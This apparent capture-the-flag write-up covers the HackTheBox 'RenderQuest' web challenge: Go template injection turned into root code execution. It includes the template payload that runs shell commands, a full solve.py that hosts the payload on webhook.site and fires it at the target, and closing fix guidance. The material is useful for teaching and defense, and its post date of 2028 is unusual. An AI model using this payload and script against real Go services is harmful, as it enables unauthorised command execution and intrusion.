---
layout: post
title: "RenderQuest"
date: 2028-02-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, go, template-injection, rce, code-injection]
description: "An Easy Web challenge where a Go service renders an attacker-supplied remote template and hands it a data object with a shell-exec method — turning server-side template injection into unauthenticated remote code execution as root."
---

## Overview

RenderQuest is an Easy **Web** challenge built around a Go web app that renders HTML
templates. One endpoint lets you point it at a **remote** template URL — and the object it
feeds into the template has a method that runs shell commands. That single combination turns
[server-side template injection](https://cwe.mitre.org/data/definitions/1336.html) into
unauthenticated [remote code execution](https://cwe.mitre.org/data/definitions/94.html) as
root.

## The technique

Go's `text/html/template` is an *execution* context, not just string interpolation: a
template can **call methods on its data object**, with arguments. If any exported method on
that object shells out, then whoever controls the template body controls the server.

The vulnerable handler (`main.go`) has two design mistakes that line up:

```go
func (p RequestData) FetchServerInfo(command string) string {
    out, _ := exec.Command("sh", "-c", command).Output()   // shells out
    return string(out)
}

// /render handler
if remote == "true" {
    tmplFile, err = readRemoteFile(page)   // page = attacker URL, fetched over HTTP
}
tmpl, _ := template.New("page").Parse(tmplFile)
tmpl.Execute(w, reqData)                    // reqData is a *RequestData
```

1. **`use_remote=true` renders an attacker-controlled template.** The `page` parameter is a
   URL the server fetches and executes verbatim. The *local*-file path has an
   `isSubdirectory` traversal guard, but the remote path skips the filesystem entirely.
2. **The data object exposes a shell-exec method.** Every exported method on the template
   data is callable as `{{.MethodName "arg"}}`. The auto-escaping in `html/template` only
   sanitizes *output* for XSS — it never blocks method calls.

## Solution

The payload template just calls the exec method:

```
{{.FetchServerInfo "id; ls -la /; cat /flag*.txt"}}
```

Two practical details decide whether it lands:

- **Host the template on a public endpoint.** The challenge container is on a public IP and
  can't route back to a local `python3 -m http.server`, so serve the template from a service
  with a controllable response body (here, a webhook.site custom response) that the box's
  `http.Get(page)` can reach.
- **Send `Cookie: user_ip=8.8.8.8`.** The handler does a geolocation lookup before rendering;
  if it fails, the request 500s and the template never runs. Pinning a resolvable IP keeps
  the lookup happy.

The flag is renamed to `/flag<random>.txt` at boot, so the shell glob `cat /flag*.txt` reads
it regardless of the suffix.

`solve.py` automates the whole thing — host the template, trigger the render, parse the flag:

```python
import sys, json, urllib.parse, urllib.request

TARGET = sys.argv[1]
CMD = "id; ls -la /; cat /flag*.txt"

def post_json(url, obj):
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                 headers={"Content-Type": "application/json"}, method="POST")
    return json.load(urllib.request.urlopen(req, timeout=20))

def get(url, cookie=None):
    req = urllib.request.Request(url)
    if cookie: req.add_header("Cookie", cookie)
    return urllib.request.urlopen(req, timeout=30).read().decode(errors="replace")

tpl = '{{.FetchServerInfo "%s"}}' % CMD
tok = post_json("https://webhook.site/token",
                {"default_status": 200, "default_content": tpl, "default_content_type": "text/plain"})
paste = "https://webhook.site/" + tok["uuid"]

enc = urllib.parse.quote(paste, safe="")
out = get(f"http://{TARGET}/render?page={enc}&use_remote=true", cookie="user_ip=8.8.8.8")
print(out)
```

Running it returns `uid=0(root)` and the flag:

```bash
python3 solve.py <host>:<port>
# uid=0(root) gid=0(root) ...
# /flag<random>.txt
# HTB{...}
```

## Why it worked

The app let the attacker supply the *entire* template body **and** handed that template a
data type with a `sh -c` method. Go templates invoke methods during execution, so those two
facts combine into RCE as root — no authentication, no bypass gymnastics. The XSS
auto-escaping that Go developers often rely on protects output rendering; it does nothing
against template-side method invocation.

## Fix / defense

- **Never render a remote or attacker-controlled string as a template.** Serve only an
  allowlist of local template files, and remove the `use_remote` feature — it is an SSRF +
  RCE primitive with no legitimate use.
- **Don't expose exec-capable methods to template execution.** Pass a purpose-built
  ViewModel with only the fields the page needs — no methods that shell out:

  ```go
  type SafeData struct{ IP, UA, Hostname, OS string }
  tmpl.Execute(w, SafeData{IP: clientIP, UA: ua, Hostname: hostname, OS: osInfo})
  ```

- If dynamic templates are truly required, parse them in a sandboxed subprocess with no
  access to the application's data types.
